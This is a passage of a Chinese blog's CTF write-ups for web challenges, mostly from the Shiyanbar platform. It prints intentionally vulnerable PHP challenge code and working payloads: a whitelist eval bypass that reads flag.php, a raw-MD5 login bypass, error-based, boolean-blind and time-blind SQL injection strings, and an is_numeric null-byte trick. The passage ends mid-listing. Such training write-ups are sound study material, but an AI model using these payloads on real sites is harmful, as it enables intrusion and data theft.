class="line">    <span class="comment">//帮你算出答案 </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到过滤了一些常用字符和基于白名单的过滤，<br>限制得比较死，故此处我们只能使用白名单内的函数来进行命令执行，且不能有黑名单内的字符。  </p><p>我们注意到，白名单里边的<code>base_convert、dechex、decbin</code>等用于进制转换的函数，我们可以使用其来绕过基于白名单的检测。比如：<code>phpinfo</code>可以将<code>phpinfo</code>先转换成<code>hex</code>，在转换成十进制，这样就可以做到无字母执行函数。  </p><p>由于长度问题，我们无法直接在参数c里传过多的白名单函数+字符，所以这里我们使用其他<code>GET</code>参数传入，不直接使用参数c，即可绕过，但要注意的是此处的参数名，不能为字母，只能为数字，不然会被第二个关键词白名单所拦截。  </p><p>再由于<code>Ascii</code>转成<code>Hex</code>后转回来需要<code>hex2bin</code>函数，而白名单里并没有这个函数，所以我们需要使用进制转换进行绕过，又因为<code>hex2bin</code>里部分字母只有在<code>32进制</code>后才会出现，所以此处我们选择<code>36进制</code>。将<code>hex2bin</code>由<code>36进制</code>成无字母的<code>10进制</code>得到：<code>37907361743</code>我们使用<code>base_convert（37907361743，10,36</code>即可转换成<code>hex2bin</code>，而<code>_GET</code>的<code>hex</code>为<code>5f474554</code>，里边包含了字母f，需要在进行一次转换：f正好为16进制里的最后一个字母，可直接使用<code>dechex(1598506324)</code>即可绕过。故<code>$sin=base_convert(37907361743,10,36)(dechex(1598506324))</code>即为<code>$sin=_GET</code><br>接着我们继续构造:<br>我们知道：<code>$$sin = $_GET</code><br>那么<code>$$sin[a]()</code>即可自定义函数名，但主要此处参数不可为字母，且<code>[]</code>被过滤，故改成<code>$$sin&#123;0&#125;($$sin&#123;1&#125;)`</code><br>所以payload构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?C&#x3D;$sin&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$sin&#123;0&#125;($$sin&#123;1&#125;);&amp;0&#x3D;show_source&amp;1&#x3D;flag.php</span><br></pre></td></tr></table></figure><br><img src="https://0d077ef9e74d8.cdn.sohucs.com/ron0lLS_png" alt="">  </p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百道CTF刷题记录(一)之实验吧</title>
      <link href="2019/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
      <url>2019/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%90%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最近在刷CTF题，主攻Web，兼职Misc<br><a id="more"></a></p><h2 id="Shiyanbar"><a href="#Shiyanbar" class="headerlink" title="Shiyanbar"></a>Shiyanbar</h2><h3 id="0x01-简单的登陆题"><a href="#0x01-简单的登陆题" class="headerlink" title="0x01 简单的登陆题"></a>0x01 简单的登陆题</h3><h4 id="简单概括："><a href="#简单概括：" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点： %00截断正则 CBC字节翻转攻击  </li><li>难度： 难  </li><li>WP：<a href="https://blog.csdn.net/include_heqile/article/details/79942993">https://blog.csdn.net/include_heqile/article/details/79942993</a>  </li></ul><h4 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h4><p>F12查看响应头，发现返回tips<br><img src="https://i.loli.net/2019/04/08/5cab35507b9c4.png" alt="">  </p><!-- more --><p>访问test.php文件得到源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &#39;***********&#39;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;conn.php&#39;);</span><br><span class="line">function sqliCheck($str)&#123;</span><br><span class="line">if(preg_match(&quot;&#x2F;\\\|,|-|#|&#x3D;|~|union|like|procedure&#x2F;i&quot;,$str))&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv&#x3D;&#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.&#x3D;chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">$iv &#x3D; get_random_iv();</span><br><span class="line">$plain &#x3D; serialize($info);</span><br><span class="line">    $cipher &#x3D; openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">global $link;</span><br><span class="line">    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))&#123;</span><br><span class="line">        $cipher &#x3D; base64_decode($_COOKIE[&#39;cipher&#39;]);</span><br><span class="line">        $iv &#x3D; base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain &#x3D; openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info &#x3D; unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">            $sql&#x3D;&quot;select * from users limit &quot;.$info[&#39;id&#39;].&quot;,0&quot;;</span><br><span class="line">            $result&#x3D;mysqli_query($link,$sql);</span><br><span class="line">            </span><br><span class="line">            if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link)))&#123;</span><br><span class="line">            $rows&#x3D;mysqli_fetch_array($result);</span><br><span class="line">echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&#39;.$rows[&#39;username&#39;].&#39;&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; (string)$_POST[&#39;id&#39;];</span><br><span class="line">    if(sqliCheck($id))</span><br><span class="line">die(&quot;&lt;h1 style&#x3D;&#39;color:red&#39;&gt;&lt;center&gt;sql inject detected!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">    $info &#x3D; array(&#39;id&#39;&#x3D;&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&#39;cipher&#39;]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#39;&lt;body class&#x3D;&quot;login-body&quot; style&#x3D;&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                &lt;div id&#x3D;&quot;wrapper&quot; style&#x3D;&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                    &lt;form name&#x3D;&quot;login-form&quot; class&#x3D;&quot;login-form&quot; action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;&#x2F;h1&gt;</span><br><span class="line">                        &lt;span&gt;input id to login&lt;&#x2F;span&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name&#x3D;&quot;id&quot; type&#x3D;&quot;text&quot; class&#x3D;&quot;input id&quot; value&#x3D;&quot;id&quot; onfocus&#x3D;&quot;this.value&#x3D;\&#39;\&#39;&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;p&gt;&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot; class&#x3D;&quot;button&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;body&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure><br>代码分析：  </p><ul><li>sqliCheck函数负责过滤sql注入</li><li>get_random_iv 生成16位随机数(Asicc范围在0~255内)iv</li></ul><p>漏洞原因：<br>aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过)</p><h3 id="0x02-后台登录"><a href="#0x02-后台登录" class="headerlink" title="0x02 后台登录"></a>0x02 后台登录</h3><h4 id="简单概括：-1"><a href="#简单概括：-1" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：md5()函数16位二进制格式绕过，<code>md5(&quot;ffifdyop&quot;,True)</code>得到的加密字符串为<code>&#39;or&#39;6&lt;crash&gt;</code>(注：<code>or &#39;数字+字母&#39;</code> 等价于<code>or true</code>)  </li><li>难度：易  </li><li>WP：<a href="https://blog.csdn.net/qq_36791003/article/details/81746730">https://blog.csdn.net/qq_36791003/article/details/81746730</a>  </li></ul><h4 id="解题过程：-1"><a href="#解题过程：-1" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开网页，右键查看源代码发现源码：<br><img src="https://i.loli.net/2019/04/08/5cab35767dac4.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $password&#x3D;$_POST[&#39;password&#39;];</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM admin WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</span><br><span class="line">$result&#x3D;mysqli_query($link,$sql);</span><br><span class="line">    if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">        echo &#39;flag is :&#39;.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#39;密码错误!&#39;;</span><br><span class="line">    &#125; --&gt;</span><br></pre></td></tr></table></figure><br>上网查了下，了解到md5($password,true)返回的是<strong>原始 16 字符二进制格式</strong>的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。<br>经过简单的Fuzz,我们知道：字符串<code>&#39;or&#39;6&lt;乱码&gt;&quot;</code>，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。<br><img src="https://i.loli.net/2019/04/08/5cab35767372d.png" alt="">  </p><h3 id="0x03-加了料的报错注入"><a href="#0x03-加了料的报错注入" class="headerlink" title="0x03 加了料的报错注入"></a>0x03 加了料的报错注入</h3><h4 id="简单概括：-2"><a href="#简单概括：-2" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li><ul><li>考点：双参数注释绕过，<code>=</code>被过滤可用<code>regexp &#39;xxx&#39;</code>和<code>in (0xaaaa)</code>代替</li></ul></li><li>难度： 中  </li><li>WP：<a href="https://www.jianshu.com/p/95f18a32ec7b">https://www.jianshu.com/p/95f18a32ec7b</a>  </li></ul><h4 id="解题过程：-2"><a href="#解题过程：-2" class="headerlink" title="解题过程："></a>解题过程：</h4><p>观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&amp;password。<br><img src="https://i.loli.net/2019/04/08/5cab35769ace0.png" alt=""><br>sql语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select * from users where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;;</span><br></pre></td></tr></table></figure><br>注意：此处可控的参数有两个。<br>简单手工测试，发现过滤了<code>#，and</code>等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。<br><img src="https://i.loli.net/2019/04/08/5cab357692922.png" alt=""><br>经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：<code>exp(~(select * from(select user())a))</code>成功爆出用户名。<br>最终我们的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;a&#39;&#x2F;*&amp;password&#x3D;*&#x2F;Or exp(~(select * from(select database())a))or&#39;1 </span><br><span class="line">&#x2F;&#x2F;查询当前数据库</span><br><span class="line">username&#x3D;a&#39;&#x2F;*&amp;password&#x3D;*&#x2F;Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp &#39;error_based_hpf&#39;)a))or&#39;1 </span><br><span class="line">&#x2F;&#x2F;查询表名，此处由于&#x3D;被过滤，我们使用regexp来绕过</span><br><span class="line">username&#x3D;a&#39;&#x2F;*&amp;password&#x3D;*&#x2F;Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)a))or&#39;1</span><br><span class="line">&#x2F;&#x2F;查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。</span><br><span class="line">username&#x3D;a&#39;&#x2F;*&amp;password&#x3D;*&#x2F;Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or&#39;1</span><br><span class="line">&#x2F;&#x2F;获取flag</span><br></pre></td></tr></table></figure></p><h3 id="0x04-认真一点！"><a href="#0x04-认真一点！" class="headerlink" title="0x04 认真一点！"></a>0x04 认真一点！</h3><h4 id="简单概括：-3"><a href="#简单概括：-3" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注  </li><li>难度：难  </li><li>WP：<a href="https://blog.csdn.net/xingyyn78/article/details/79747404">https://blog.csdn.net/xingyyn78/article/details/79747404</a>  </li></ul><h4 id="解题过程：-3"><a href="#解题过程：-3" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开网页，随便输入个数字，页面返回<code>You are in...</code>，输入在数字后加单引号，返回<code>You are not in...</code>。<br><img src="https://i.loli.net/2019/04/08/5cab407181198.png" alt=""><br>猜测此处考的是bool盲注，根据页面返回的内容判断真假。<br>经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：<code>oorr</code>就好了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;aaa&#39;oorr(1&#x3D;1)&#x3D;&#39;1  &#x2F;&#x2F;返回You are in</span><br><span class="line">id&#x3D;aaa&#39;oorr(1&#x3D;2)&#x3D;&#39;1  &#x2F;&#x2F;返回You are not in</span><br><span class="line">&#x2F;&#x2F; 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句</span><br><span class="line">&#x2F;&#x2F; 即：false ∪ (条件一) &#x3D; 条件一</span><br></pre></td></tr></table></figure><br>我们先判断数据库长度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;aaa&#39;oorr(length(database())&gt;1)&#x3D;&#39;1</span><br></pre></td></tr></table></figure><br>其次循环取数据库名进行判断：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;aaa&#39;oorr(mid((select+database())from(1)foorr(1))&#x3D;&#39;c&#39;)&#x3D;&#39;1 </span><br><span class="line">&#x2F;&#x2F;由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤</span><br></pre></td></tr></table></figure><br>接着循环判断表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;aaa&#39;oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;database()))from(1)foorr(1))&#x3D;&#39;a&#39;)&#x3D;&#39;1</span><br></pre></td></tr></table></figure><br>之后就不写了，与上边类似，写脚本跑就好。  </p><h3 id="0x05-你真的会PHP吗？"><a href="#0x05-你真的会PHP吗？" class="headerlink" title="0x05 你真的会PHP吗？"></a>0x05 你真的会PHP吗？</h3><h4 id="简单概括：-4"><a href="#简单概括：-4" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：<code>2147483647</code>(2^31-1) 64位：<code>9223372036854775807</code>(2^63-1)  </li><li>难度：中  </li><li>WP：<a href="https://blog.csdn.net/JBlock/article/details/78745513">https://blog.csdn.net/JBlock/article/details/78745513</a>  </li></ul><h4 id="解题过程：-4"><a href="#解题过程：-4" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，发现返回头存在提示信息：<br><img src="https://i.loli.net/2019/04/09/5cac89ded0e73.png" alt=""><br>打开链接获得源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$info &#x3D; &quot;&quot;; </span><br><span class="line">$req &#x3D; [];</span><br><span class="line">$flag&#x3D;&quot;xxxxxxxxxx&quot;;</span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&#39;number&#39;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key &#x3D;&gt; $value) &#123; </span><br><span class="line">        $value &#x3D; trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] &#x3D; addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number &#x3D; strval($number); </span><br><span class="line">    $i &#x3D; 0; </span><br><span class="line">    $j &#x3D; strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !&#x3D;&#x3D; $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line">if(is_numeric($_REQUEST[&#39;number&#39;]))&#123;</span><br><span class="line">     $info&#x3D;&quot;sorry, you cann&#39;t input a number!&quot;;</span><br><span class="line">&#125;elseif($req[&#39;number&#39;]!&#x3D;strval(intval($req[&#39;number&#39;])))&#123;</span><br><span class="line">     $info &#x3D; &quot;number must be equal to it&#39;s integer!! &quot;;  </span><br><span class="line">&#125;else&#123;</span><br><span class="line">     $value1 &#x3D; intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 &#x3D; intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line">     if($value1!&#x3D;$value2)&#123;</span><br><span class="line">          $info&#x3D;&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info &#x3D; &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info&#x3D;$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $info;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>代码流程：<br><code>is_numeric[false] &amp;&amp; $req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))[false]</code><br>-&gt; <code>$value1!=$value2[false]</code><br>-&gt; <code>is_palindrome_number($req[&quot;number&quot;])[true]</code>  </p><p><strong>我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。</strong><br>PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741&gt;2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。<br>而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。<br>综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。</p><blockquote><p>此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。  </p></blockquote><p><img src="https://i.loli.net/2019/04/09/5cac89deb6100.png" alt=""></p><h3 id="0x06-登陆一下好吗"><a href="#0x06-登陆一下好吗" class="headerlink" title="0x06 登陆一下好吗??"></a>0x06 登陆一下好吗??</h3><h4 id="简单概括：-5"><a href="#简单概括：-5" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：登录框万能密码  </li><li>难度：中  </li><li>WP：<a href="https://blog.csdn.net/h1012946585/article/details/79851884">https://blog.csdn.net/h1012946585/article/details/79851884</a>  </li></ul><h4 id="解题过程：-5"><a href="#解题过程：-5" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用<code>&#39;=&#39;</code>成功。</p><h3 id="0x07-who-are-you"><a href="#0x07-who-are-you" class="headerlink" title="0x07 who are you?"></a>0x07 who are you?</h3><h4 id="简单概括：-6"><a href="#简单概括：-6" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：时间盲注，and case when () then () else () end绕过逗号过滤。  </li><li>难度：中  </li><li>WP：<a href="https://blog.csdn.net/wy_97/article/details/75643252">https://blog.csdn.net/wy_97/article/details/75643252</a>  </li></ul><h4 id="解题过程：-6"><a href="#解题过程：-6" class="headerlink" title="解题过程："></a>解题过程：</h4><p>抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：<br><img src="https://i.loli.net/2019/04/09/5cac910608206.png" alt=""><br>简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替：</p><ul><li>X-Forwarded-For: 127.0.0.1’and case when(length(database())&gt;1)then(sleep(5))else(sleep(0))end and ‘1  </li></ul><p>剩下的就是写脚本慢慢跑了，此处略过。</p><h3 id="0x08-因缺思汀的绕过"><a href="#0x08-因缺思汀的绕过" class="headerlink" title="0x08 因缺思汀的绕过"></a>0x08 因缺思汀的绕过</h3><h4 id="简单概括：-7"><a href="#简单概括：-7" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：<code>gourp by xxx with rollup limit 1 offset x#</code>【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】  </li><li>难度：中  </li><li>WP：<a href="https://blog.csdn.net/qq_35078631/article/details/54772798">https://blog.csdn.net/qq_35078631/article/details/54772798</a>  </li></ul><h4 id="解题过程：-7"><a href="#解题过程：-7" class="headerlink" title="解题过程："></a>解题过程：</h4><p>右键源代码得到提示信息<code>source.txt</code>，打开得到源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) &#123;</span><br><span class="line">echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;input name&#x3D;&quot;uname&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;input name&#x3D;&quot;pwd&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span 